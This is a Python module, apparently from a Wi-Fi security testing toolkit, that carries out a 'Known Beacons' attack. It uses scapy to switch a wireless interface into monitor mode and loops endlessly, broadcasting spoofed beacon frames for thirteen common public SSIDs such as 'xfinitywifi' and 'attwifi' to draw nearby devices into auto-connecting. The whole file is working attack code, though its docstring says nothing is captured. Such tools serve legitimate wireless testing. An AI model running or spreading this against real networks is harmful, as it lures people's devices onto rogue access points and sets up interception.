"""Known Beacons attack - broadcasts common SSIDs to test auto-connect.

Demonstrates risk of devices automatically connecting to open networks.
No credentials are captured or stored.
"""
import time
from pathlib import Path
from scapy.all import Dot11, Dot11Beacon, Dot11Elt, RadioTap, sendp
from wifitest.logger import SessionLogger
from wifitest.adapter import enable_monitor_mode, disable_monitor_mode

DEFAULT_BEACONS = [
    "xfinitywifi", "attwifi", "Google Starbucks", "CableWiFi",
    "SpectrumWiFi", "BTWifi", "SkyWifi", "FreeWiFi", "OpenWiFi",
    "Hotel_Guest", "Airport_Free", "CoffeeShop", "GuestNetwork",
]


def run_known_beacons(logger: SessionLogger, interface: str,
                      beacon_list: str = None, **kwargs) -> None:
    """Broadcast a list of common SSIDs."""
    ssids = DEFAULT_BEACONS[:]
    if beacon_list:
        custom = Path(beacon_list).read_text().splitlines()
        ssids = [s.strip() for s in custom if s.strip()]

    mon_iface = enable_monitor_mode(interface)
    logger.event("known_beacons_started", interface=mon_iface, count=len(ssids))

    try:
        while True:
            for ssid in ssids:
                _send_beacon(mon_iface, ssid)
                time.sleep(0.1)
    except KeyboardInterrupt:
        pass
    finally:
        disable_monitor_mode(mon_iface)
        logger.event("known_beacons_stopped")


def _send_beacon(iface: str, ssid: str) -> None:
    """Send a beacon frame advertising an SSID."""
    try:
        radio = RadioTap()
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                      addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")
        beacon = Dot11Beacon(cap="ESS")
        elt = Dot11Elt(ID="SSID", info=ssid.encode())
        pkt = radio / dot11 / beacon / elt
        sendp(pkt, iface=iface, verbose=False, count=1)
    except Exception:
        pass
